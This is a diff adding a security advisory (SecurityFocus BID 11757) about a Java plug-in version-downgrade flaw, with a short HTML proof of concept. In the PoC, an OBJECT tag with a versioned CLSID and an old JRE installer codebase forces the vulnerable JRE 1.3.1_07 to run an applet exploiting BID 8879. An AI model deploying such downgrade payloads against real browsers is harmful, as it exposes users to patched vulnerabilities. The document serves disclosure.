@@ -1,0 +1,44 @@
+source: http://www.securityfocus.com/bid/11757/info
+
+Java provides support for dynamic and static versioning when loading applets in the Java plug-in. This means that during the invocation of an applet, a user can request that a particular version of a plug-in be used to run the applet. The feature is accessible through various HTML tags that allow Java applets to be embedded in HTML documents, such as the EMBED, OBJECT, and APPLET tags. 
+
+This feature presents a security weakness in that it may be abused to cause a previous version of a plug-in that is known to be prone to security vulnerabilities to be loaded in lieu of a more recent, fixed version. For this design flaw to pose a security threat, a vulnerable plug-in must either already be installed on the host computer or the user must manually install a version that is prone to security vulnerabilities. If a targeted version is not installed, the user may be prompted to install it.
+
+This weakness could result in a false sense of security, since the user may believe that installing an updated version will eliminate vulnerabilities in previous versions. 
+
+Note that since this feature is supported in various browsers, the browsers themselves may be prone to the issue. Some browsers may not allow a Java plug-in that is no longer registered with the browser to run. 
+
+<html> 
+<title> Java Version Downgrade proof-of-concept </title> 
+<body> 
+Demonstration uses the following vulnerability: 
+<br> 
+http://www.securityfocus.com/bid/8879 
+<br> 
+Source code for Simple.class: 
+<br> 
+http://www.securityfocus.com/bid/8879/exploit/ 
+<p> 
+Added this code to Simple.java for debugging purposes: 
+<br> 
+String javaVersion = System.getProperty("java.version"); 
+<br> 
+addItem("Java version: " + javaVersion); 
+<p> 
+This proof-of-concept was tested on a Windows system using IE with 
+the following Java installations: 
+<br> 
+Sun JRE 1.3.1_07 (vulnerable to BID 8879) 
+<br> 
+Sun JRE 1.3.1_13 (not vulnerable to BID 8879) 
+<br> 
+note: invoking applet normally should run Simple.class in JRE 
+1.3.1_13. 
+<p> 
+<OBJECT classid="clsid:CAFEEFAC-0013-0001-0007-ABCDEFFEDCBA" 
+width = "600" height = "100" 
+codebase="http://java.sun.com/products/plugin/autodl/jinstall-1_3_1_07-windows-i586.cab##Version=1_3_1_07"> 
+<PARAM NAME="code" VALUE="Simple.class"> 
+</OBJECT> 
+</body> 
+</html>
